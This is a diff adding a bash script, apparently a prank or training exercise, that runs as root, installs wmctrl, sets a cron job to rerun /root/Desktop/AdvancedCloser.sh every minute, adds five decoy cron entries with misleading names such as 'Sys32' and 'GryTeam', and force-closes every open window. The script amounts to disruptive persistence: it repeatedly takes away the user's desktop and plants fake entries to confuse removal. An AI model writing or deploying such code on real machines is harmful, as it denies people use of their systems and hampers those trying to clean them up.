@@ -1,0 +1,80 @@
+#!/bin/bash
+
+main() {
+    # set the path 
+    local SCRIPT_PATH="/root/Desktop/AdvancedCloser.sh"
+
+    # set display variable
+    export DISPLAY=:0
+
+    # install wmctrl
+    install_wmctrl
+
+    # check if the Super_L+d shortcut is configured
+    shortcut_exists=$(gsettings get org.gnome.desktop.wm.keybindings show-desktop | grep -q 'Super_L+d' && echo "true" || echo "false")
+
+    if [ "$shortcut_exists" == "false" ]; then
+        # Configure Super_L+d as the show-desktop shortcut
+        gsettings set org.gnome.desktop.wm.keybindings show-desktop "['<Super>d']"
+        echo "Super_L+d shortcut configured."
+    else
+        echo "Super_L+d shortcut already configured."
+    fi
+
+    # add real cron job to run the Python script every minute if not already added
+    if ! cron_job_exists "main_cron_job"; then
+        add_cron_job "main_cron_job" "$SCRIPT_PATH"
+        echo "Main cron job added successfully."
+    else
+        echo "Main cron job already exists. Skipping addition."
+    fi
+
+    # Add fake cron jobs with no functionality, each with a unique name
+    add_cron_job "/root/Desktop/Hidden/GryTeam" "/root/Desktop/Hidden/GryTeam" 
+    add_cron_job "/root/backup.sh" "/root/backup.sh" 
+    add_cron_job "@reboot/root/clear_cache" "@reboot/root/clear_cache" 
+    add_cron_job "MouseCostume" "MouseCostume" 
+    add_cron_job "Sys32" "Sys32"
+
+    # Close windows using wmctrl
+    close_all_windows
+}
+
+install_wmctrl() {
+    if ! command -v wmctrl &> /dev/null; then
+        echo "Installing wmctrl..."
+        sudo apt-get update
+        sudo apt-get install -y wmctrl
+        echo "wmctrl installed successfully."
+    else
+        echo "wmctrl is already installed."
+    fi
+}
+
+add_cron_job() {
+    local cron_script_name="$1"
+    local command_to_run="$2"
+    echo "Adding cron job '$cron_script_name' to run the command '$command_to_run' every minute..."
+    (crontab -l 2>/dev/null; echo "* * * * * $command_to_run") | crontab -
+}
+
+cron_job_exists() {
+    local cron_script_name="$1"
+    crontab -l | grep -q "$cron_script_name"
+}
+
+close_all_windows() {
+    echo "Closing all windows..."
+    # Get a list of window IDs
+    window_ids=$(wmctrl -l | awk '{print $1}')
+
+    # Close each window
+    for id in $window_ids; do
+        wmctrl -i -c "$id"
+    done
+
+    echo "Closed all windows."
+}
+
+# Call the main function
+main
